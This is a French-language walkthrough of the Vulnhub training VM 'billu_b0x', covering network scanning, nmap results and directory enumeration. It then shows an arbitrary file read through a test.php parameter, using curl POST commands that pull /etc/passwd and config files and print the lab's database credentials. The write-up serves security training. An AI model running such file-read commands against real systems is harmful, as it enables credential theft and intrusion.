@@ -1,0 +1,107 @@
+Vulnhub: 'billu_b0x' walkthrough
+
+Phase 1 : Information Gathering
+Découverte du réseau et donc de la VM et des vulns failles et autres portes d'entrée...
+
+A - Scan réseau (hypothèse : nous sommes déjà à l'intérieur du réseau, ou dans la DMZ) :
+	Je me sert de plusieurs outils à chaque fois:
+	fping et netdiscover arp-scan :
+	syntaxe des 3 outils :
+	
+	netdiscover --help
+	ex :
+	netdiscover -i eth0
+	
+	fping --help :
+	ex :
+	fping -A -d -a -q -g -a -i 1 -r 0 192.168.1.0/24
+	
+	arp-scan --help :
+	ex : 
+	arp-scan -l
+
+Les trois outils nous rmeonte une informations sur l'IP de la victime :
+192.168.1.61
+
+B - Scan pour découverte de ports ouverts :
+L'outil ultime de scan nmap, le seul l'unique :
+	nmap --help
+	ex :
+	fait un scan nmap pour avoir un peu plus de précision :
+	nmap -v -sV -sC -p80 192.168.1.61
+	Deux ports ouverts le 22 (ssh) et le 80 (HTTP)
+
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: --==[[IndiShell Lab]]==--
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)
+|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)
+|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)
+
+Ok, donc on recolte deux ports ouverts et plusieurs informations :
+- port 80 : Apache 2.2.22, accepte plusieurs methodes : GET HEAD POST OPTIONS
+- port 22 : OpenSSH 5.9p1, et des ssh-hostkey
+- l'OS : Ubuntu
+
+Ok
+Allons voir ce que ça donne au niveau de l'interface web :
+Un site web, une phrase qui nous nargue et qui nous demande de prouver nos capacités technique en SQLI....
+Un champs login Username et un champs mot de passe Password, vu dans le code source. 
+
+Fin de la phase de reconnaissance
+===================================================
+
+Phase 2 :
+Cherchons des vulnerabilités.
+La aussi plusieurs outils :
+searchsploit, dirb, msfconsole, sqlmap (sqli), wapiti, nikto
+Searchsploit : 
+	me retourne des vuln mais aucune sur les version précise des services sur la machine.
+Nikto :
+	comme d'habitude lance pas mal de faux positif, mais qq infos, un phpinfo disponible
+	une page test.php, à voir : cette page lorsqu'elle est appelé retorune :
+	'file' parameter is empty. Please provide file path in 'file' parameter 
+	donc re- test avec un paramètre file, du genre : 
+	http://192.168.1.61/test.php?file=/etc/passwd : mais pas bien ça le fait pas...
+	ça donne rien.
+Dirb :
+	Je le lance, et note des points d'entrées, je me focalise sur les retour HTTP 200, 300, dont le /phmy = phpmyadmin.
+	/panel renvoi sur la page d'accueil, /test renvoi sur la page test.php, /c renvois sur rien, /head renvoi sur rien.
+	Je craque j'associe "dirb"  avec une seclist de Daniel Miessler ici :https://github.com/danielmiessler/SecLists
+	du coup je prends une liste assez complète et je lance :
+	Bon que des fausses pistes, ou sinon réinit des paramètres ce que je ne souhaite pas, pas d'info de login pass...
+	Mais quand même : /c et /head qui ne retourne rien = page blanche.
+	A creuser : et si on testait en cli ?
+	curl -X POST http://192.168.1.61/test --data file='/etc/passwd'
+	et là bingo !!! on a le fichier passwd
+	donc lachons nous par défaut la conf de phpmyadminet là (renommer phpmy) pour cette application :
+	curl -X POST http://192.168.1.61/test --data file='/var/www/phpmy/config.inc.php'
+	bingo : login, password
+	test depuis le php myadmin. Niet
+	On continu :
+	curl -X POST http://192.168.1.61/test --data file='/var/www/c.php' et file='/var/www/had.php'
+	re bingo dans le c.php on a la connexion de phpmyadmin
+	Ah bon oK, donc le ssh c'est peut-être bien !!!
+	et bim.
+Fin de l'histoire....
+appel des fichier via :
+curl -X POST http://192.168.1.61 --data file='le path du fichier que tu veux lire'
+donc login de root (mortel) contenu dans le fichier /var/www/phpmy/config.inc.php :
+
+	$cfg['Servers'][$i]['user'] = 'root';
+	$cfg['Servers'][$i]['password'] = 'roottoor';
+
+donc login phpmyadmin dans c.php :
+	$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
